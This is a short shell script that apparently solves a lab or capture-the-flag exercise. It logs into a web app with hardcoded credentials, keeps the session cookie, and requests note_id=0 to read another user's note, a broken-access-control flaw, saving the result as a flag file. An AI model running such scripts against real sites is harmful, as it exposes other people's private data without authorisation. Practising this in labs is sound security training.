#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/

# Authenticate and save the PHPSESSID cookie
echo "Authenticating and capturing PHPSESSID..."
curl -X GET "$target_ip" -c "/work/cookie-bac.txt" -L -v
curl -s -X POST "$target_ip" -b /work/cookie-bac.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "username=noot&password=test1234"

# Extract the PHPSESSID
PHPSESSID=$(grep PHPSESSID "/work/cookie-bac.txt" | awk '{print $7}')

# Check if the PHPSESSID was retrieved
if [ -z "$PHPSESSID" ]; then
    echo "Authentication failed. No PHPSESSID received."
    rm -f /work/cookie-bac.txt
    exit 1
fi

echo "Authentication successful. PHPSESSID: $PHPSESSID"

# Use the PHPSESSID for the next HTTP request
echo "Fetching protected resource..."
curl -s -X GET "$target_ip/note.php?note_id=0" -b /work/cookie-bac.txt -H "Content-Type: application/json" -o /work/bac-flag.html -L -v

# Clean up
#rm -f /work/cookie-bac.txt
echo "Done."